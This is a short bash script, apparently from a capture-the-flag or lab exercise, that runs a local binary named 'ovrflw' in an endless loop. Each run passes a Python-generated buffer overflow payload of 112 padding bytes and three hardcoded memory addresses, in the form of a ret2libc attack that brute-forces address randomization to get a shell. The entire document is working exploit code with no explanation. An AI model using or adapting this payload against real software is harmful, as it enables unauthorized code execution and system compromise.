i=0
while true;
do
	echo Attack: $i
	./ovrflw $(python -c 'print("A"*112 + "\xf0\x75\xe1\xf7" + "\x60\xa3\xe0\xf7" + "\x06\xb4\xf5\xf7")');
	i=$((i+1))
done
